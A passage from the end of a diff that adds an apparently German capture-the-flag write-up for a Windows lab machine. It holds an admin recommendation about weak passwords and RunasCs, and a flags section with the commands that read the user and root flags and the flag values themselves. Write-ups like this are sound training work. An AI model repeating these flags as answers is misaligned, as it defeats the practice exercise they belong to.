+              <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Schwachstellen, die zur Eskalation führten (schwache Passwörter, unsichere Tools wie RunasCs zulassen).</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der User-Flagge (als nica) -->
+                     <div class="flag-command">cat C:\Users\nica\user.txt</div>
+                     <!-- User-Flagge -->
+                     <div class="flag-value"><span class="password">HMVWINGIFT</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der Root-Flagge (als akanksha/Administrator) -->
+                     <div class="flag-command">type C:\Users\Administrador\Desktop\root.txt</div>
+                     <!-- Root-Flagge -->
+                     <div class="flag-value"><span class="password">HMV1STWINDWZ</span></div>
+                 </div>
+             </div>
+             <!-- Keine Analyse/Bewertung/Empfehlung im Flags-Abschnitt -->
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nikto Scan übernommen -->
+        <p>Berichtsdatum: 2023-10-01</p>
+    </footer>
+</body>
+</html>
